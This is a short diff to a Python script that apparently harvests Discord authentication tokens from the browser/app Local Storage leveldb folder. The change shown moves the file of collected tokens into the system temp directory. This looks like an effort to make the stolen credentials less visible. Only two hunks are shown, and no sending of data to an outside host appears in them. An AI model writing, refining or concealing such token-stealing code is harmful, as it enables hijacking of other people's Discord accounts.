@@ -1,6 +1,7 @@
 import os
 import re
 import json
+import tempfile
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
@@ -49,7 +50,10 @@ def main():
 
         output += '```'
 
-    with open('discord_token.txt', 'w') as file:
+    temp_folder = tempfile.gettempdir()
+    output_file = os.path.join(temp_folder, 'discord_token.txt')
+
+    with open(output_file, 'w') as file:
         file.write(output)
 
 if __name__ == '__main__':
